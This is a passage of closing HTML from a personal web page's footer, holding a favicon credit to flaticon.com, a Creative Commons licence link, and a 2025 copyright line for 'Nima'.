          favicon made by <a href="https://www.flaticon.com/authors/juicy-fish">juicy-fish</a> from <a href="https://www.flaticon.com">www.flaticon.com</a>
        </span>
        <br>
        <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
          <span>
              <b>Nima</b>
          </span>
          
          <span>Â© 2025</span>
        </a>
      </div>
    </div>
  </div>
</footer>


    
  </body>
</html>
